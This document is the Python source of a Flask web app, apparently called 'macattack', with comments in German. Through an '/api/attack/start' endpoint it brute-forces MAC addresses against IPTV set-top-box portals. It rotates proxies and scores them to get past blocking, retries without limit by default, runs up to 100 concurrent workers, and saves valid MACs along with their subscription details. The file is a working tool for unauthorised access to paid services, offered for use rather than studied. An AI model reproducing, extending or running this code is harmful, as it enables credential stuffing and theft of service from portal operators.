import os, json, threading, asyncio, secrets, logging
from datetime import datetime
from functools import wraps
from collections import deque
from flask import Flask, render_template, request, jsonify, Response, session
import stb  # Nutzt jetzt die neue stb.py

# Konfiguration laden (Docker Pfade)
CONFIG_FILE = os.getenv("CONFIG", "/app/data/macattack.json")
app = Flask(__name__)
app.secret_key = secrets.token_urlsafe(32)

SCAN_STATE = {"running": False, "total": 0, "checked": 0, "hits": 0, "errors": 0, "active_proxies": 0}

def load_config():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as f: return json.load(f)
    return {"portals": [], "proxies": [], "found_macs": [], "settings": {"auth_enabled": False, "unlimited_retries": True}}

def save_config(conf):
    os.makedirs(os.path.dirname(CONFIG_FILE), exist_ok=True)
    with open(CONFIG_FILE, 'w') as f: json.dump(conf, f, indent=4)

def requires_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        conf = load_config()
        if conf.get("settings", {}).get("auth_enabled") and not session.get("logged_in"):
            return jsonify({"error": "Unauthorized"}), 401
        return f(*args, **kwargs)
    return decorated

class AsyncScanner:
    def __init__(self, macs, portal, proxies, threads, skip_unl, unl_retries):
        self.macs = macs
        self.portal = portal
        self.proxies = deque([{'url': p, 'score': 10} for p in proxies])
        self.threads = threads
        self.skip_unl = skip_unl
        self.unl_retries = unl_retries
        self.queue = asyncio.Queue()
        self.retry_counts = {}
        self.client = stb.AsyncStbClient()

    async def worker(self):
        while SCAN_STATE['running']:
            try: item = await asyncio.wait_for(self.queue.get(), timeout=1.0)
            except: continue
            if not self.proxies: break
            p_obj = self.proxies.popleft()
            try:
                success, data = await self.client.quick_scan(self.portal, item['mac'], p_obj['url'])
                SCAN_STATE['checked'] += 1
                if success:
                    p_obj['score'] = min(p_obj['score'] + 1, 20)
                    if not ('unlimited' in str(data['expiry']).lower() and self.skip_unl):
                        data = await self.client.fetch_details(data, p_obj['url'])
                    data['found_at'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    SCAN_STATE['hits'] += 1
                    conf = load_config(); conf['found_macs'].append(data); save_config(conf)
                self.proxies.append(p_obj)
            except:
                p_obj['score'] -= 1
                if p_obj['score'] > 0: self.proxies.append(p_obj)
                retries = self.retry_counts.get(item['mac'], 0)
                if self.unl_retries or retries < 10:
                    self.retry_counts[item['mac']] = retries + 1
                    await self.queue.put(item)
                else: SCAN_STATE['errors'] += 1
            finally:
                self.queue.task_done()
                SCAN_STATE['active_proxies'] = len(self.proxies)

    async def run(self):
        for m in self.macs: await self.queue.put({'mac': m})
        workers = [asyncio.create_task(self.worker()) for _ in range(self.threads)]
        await self.queue.join()
        await self.client.close()
        SCAN_STATE['running'] = False

@app.route('/')
def index(): return render_template('index.html', version="3.1-Async")

@app.route('/api/attack/start', methods=['POST'])
@requires_auth
def api_start():
    data = request.json
    conf = load_config()
    SCAN_STATE.update({"running": True, "total": len(data['macs']), "checked": 0, "hits": 0, "errors": 0})
    def run_loop():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        scanner = AsyncScanner(data['macs'], data['portal'], data['proxies'], int(data.get('threads', 100)), data.get('skip_unlimited', False), conf['settings'].get('unlimited_retries', True))
        loop.run_until_complete(scanner.run())
    threading.Thread(target=run_loop, daemon=True).start()
    return jsonify({"success": True})

@app.route('/api/attack/status')
def api_status(): return jsonify(SCAN_STATE)

@app.route('/api/found', methods=['GET', 'DELETE'])
@requires_auth
def api_found():
    conf = load_config()
    if request.method == 'DELETE':
        conf['found_macs'] = []; save_config(conf)
        return jsonify({"success": True})
    return jsonify(conf.get('found_macs', []))

# ... (Andere API Routen wie /api/proxies bleiben gleich) ...

if __name__ == "__main__":
    # WICHTIG: Docker nutzt intern 8080
    app.run(host="0.0.0.0", port=8080)
